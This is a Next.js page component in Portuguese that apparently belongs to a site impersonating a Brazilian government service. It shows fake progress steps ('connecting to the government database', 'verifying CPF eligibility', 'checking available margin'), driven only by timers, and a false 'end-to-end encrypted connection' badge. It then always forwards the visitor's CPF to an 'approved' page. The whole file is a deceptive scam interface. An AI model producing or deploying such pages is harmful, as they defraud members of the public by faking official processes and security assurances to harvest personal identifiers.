"use client";

import { GovHeader } from "@/components/GovHeader";
import { Loader2, ShieldCheck, Server, Database } from "lucide-react";
import { useRouter, useSearchParams } from "next/navigation";
import { useEffect, useState, Suspense } from "react";

function AnaliseContent() {
    const router = useRouter();
    const searchParams = useSearchParams();

    const [steps, setSteps] = useState([
        { id: 1, text: "Conectando ao banco de dados do Governo...", status: "pending" },
        { id: 2, text: "Verificando elegibilidade do CPF...", status: "pending" },
        { id: 3, text: "Consultando margem disponível...", status: "pending" }
    ]);

    useEffect(() => {
        // Simulate step progress with longer timing
        const timings = [2000, 4500, 7000];

        timings.forEach((time, index) => {
            setTimeout(() => {
                setSteps(prev => prev.map((step, i) =>
                    i === index ? { ...step, status: "completed" } :
                        i === index + 1 ? { ...step, status: "loading" } : step
                ));
            }, time);
        });

        // Redirect to approved page after 9 seconds
        setTimeout(() => {
            // Keep all params including CPF
            const params = new URLSearchParams(searchParams.toString());
            router.push(`/aprovado?${params.toString()}`);
        }, 9000);
    }, [router, searchParams]);

    return (
        <div className="min-h-screen bg-slate-50 flex flex-col">
            <GovHeader />

            <main className="flex-1 flex flex-col items-center justify-center p-6">
                <div className="max-w-md w-full bg-white rounded-2xl shadow-xl p-8 border border-slate-100">

                    <div className="flex justify-center mb-8">
                        <div className="relative">
                            <div className="absolute inset-0 bg-blue-500 rounded-full opacity-20 animate-ping"></div>
                            <div className="relative bg-white p-4 rounded-full shadow-sm border border-slate-100">
                                <Loader2 className="h-12 w-12 text-gov-blue-600 animate-spin" />
                            </div>
                        </div>
                    </div>

                    <h2 className="text-2xl font-bold text-center text-slate-800 mb-2">
                        Processando Solicitação
                    </h2>
                    <p className="text-center text-slate-500 mb-8 text-sm">
                        Aguarde enquanto nosso sistema valida suas informações junto aos órgãos competentes.
                    </p>

                    <div className="space-y-4">
                        {steps.map((step) => (
                            <div key={step.id} className="flex items-center gap-3 transition-all duration-300">
                                <div className={`
                                    w-6 h-6 rounded-full flex items-center justify-center flex-shrink-0
                                    ${step.status === 'completed' ? 'bg-green-100 text-green-600' :
                                        step.status === 'loading' ? 'bg-blue-100 text-blue-600' : 'bg-slate-100 text-slate-300'}
                                `}>
                                    {step.status === 'completed' ? (
                                        <ShieldCheck className="h-3.5 w-3.5" />
                                    ) : step.status === 'loading' ? (
                                        <Loader2 className="h-3.5 w-3.5 animate-spin" />
                                    ) : (
                                        <div className="w-1.5 h-1.5 bg-current rounded-full" />
                                    )}
                                </div>
                                <span className={`text-sm font-medium ${step.status === 'completed' ? 'text-slate-700' :
                                    step.status === 'loading' ? 'text-gov-blue-700' : 'text-slate-400'
                                    }`}>
                                    {step.text}
                                </span>
                            </div>
                        ))}
                    </div>

                    <div className="mt-8 pt-6 border-t border-slate-50 flex items-center justify-center gap-2 text-xs text-slate-400">
                        <Server className="h-3 w-3" />
                        <span>Conexão criptografada de ponta a ponta</span>
                    </div>
                </div>
            </main>
        </div>
    );
}

export default function AnalisePage() {
    return (
        <Suspense fallback={
            <div className="min-h-screen bg-slate-50 flex items-center justify-center">
                <Loader2 className="h-8 w-8 text-gov-blue-600 animate-spin" />
            </div>
        }>
            <AnaliseContent />
        </Suspense>
    );
}
